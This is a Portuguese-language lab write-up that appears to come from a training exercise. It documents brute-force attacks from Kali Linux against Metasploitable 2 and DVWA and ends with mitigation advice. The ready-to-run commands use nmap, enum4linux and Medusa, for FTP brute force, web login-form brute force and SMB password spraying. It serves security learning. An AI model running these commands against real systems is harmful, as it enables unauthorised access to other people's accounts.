# 🛡️ Projeto de Testes de Força Bruta com Kali Linux, Medusa e Ambientes Vulneráveis
Este projeto documenta a implementação prática de ataques de força bruta utilizando Kali Linux, a ferramenta Medusa e ambientes vulneráveis como Metasploitable 2 e DVWA.
O objetivo é simular cenários reais de ataque, compreender o funcionamento das ferramentas e reforçar conhecimentos sobre mitigação e boas práticas de segurança.

---

# 📌 Objetivos do Desafio
* Configurar um ambiente controlado com duas VMs (Kali Linux e Metasploitable 2) em rede interna.
* Realizar ataques simulados:
* Força bruta em FTP
* Automação de tentativas em formulário web (DVWA)
* Password spraying em SMB, com enumeração de usuários
* Documentar:
* Wordlists utilizadas
* Comandos executados
* Resultados obtidos
* Recomendações de mitigação

---

# 🖥️ Arquitetura do Ambiente
| Máquina | Sistema | Função | IP |
| :--- | :--- |:--- |:--- |
| Kali Linux | Kali 2023+ | Atacante | 192.168.56.101 |
| Metasploitable 2 | Ubuntu vulnerável | Alvo | 192.168.56.102 

Rede configurada em Host-Only no VirtualBox

---

# 🔍 1. Enumeração Inicial com Nmap
Primeiro, identificamos serviços expostos no alvo:

nmap -sV -p 21,22,80,445,139 192.168.56.102

Serviços encontrados:
* FTP (vsFTPd 2.3.4)
* SSH
* HTTP (DVWA)
* SMB (Samba)
* NetBIOS

---

# 🔐 2. Ataque de Força Bruta em FTP
**Criando wordlists simples:**

- echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
- echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

**Executando o ataque com Medusa:**

- medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6

**Resultado**

O Medusa encontrou credenciais válidas:
* Usuário: msfadmin
* Senha: msfadmin

**Validando acesso:**

- ftp 192.168.56.102

**Login bem-sucedido:**

- 230 Login successful.

# 🌐 3. Ataque ao Formulário Web (DVWA)
Acessamos o DVWA:

http://192.168.56.102/dvwa/login.php

Com o DevTools (F12), identificamos os campos:
- username
- password
- Botão: Login
 
**Ataque com Medusa:**

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6

**Resultado**

Credenciais válidas foram encontradas e o login no DVWA foi possível.

# 📁 4. Enumeração e Password Spraying em SMB
**Enumerando usuários com enum4linux:**

enum4linux -a 192.168.56.102 | tee enum4_output.txt

**Criando wordlists:**

- echo -e "user\nmsfadmin\nservice" > smb_users.txt
- echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

**Ataque de password spraying:**

- medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

**Validando acesso SMB:**

- smbclient -L //192.168.56.102 -U msfadmin

# 📊 Resultados Obtidos
| Serviço | Método | Resultado | 
| :--- | :--- |:--- |
| FTP | Força bruta | Acesso obtido | 
| DVWA | Força bruta em formulário | Acesso obtido |
| SMB | Password spraying | Usuário válido identificado |

# 🛡️ Recomendações de Mitigação
**🔒 FTP**

- Desabilitar FTP e usar SFTP/FTPS
- Implementar fail2ban
- Exigir senhas fortes

**🌐 Aplicações Web**

- Implementar CAPTCHA
- Limitar tentativas de login
- Usar MFA

**📁 SMB**

- Bloquear contas após tentativas falhas
- Usar políticas de senha forte
- Restringir acesso SMB na rede

**🧱 Geral**

- Monitoramento contínuo
- Atualizações e patches
- Segmentação de rede

---

# 📚 Aprendizados
- A importância da enumeração antes do ataque
- Como ferramentas simples podem comprometer sistemas mal configurados
- A necessidade de políticas de senha e proteção contra brute force
- Como ambientes vulneráveis ajudam no aprendizado seguro

---
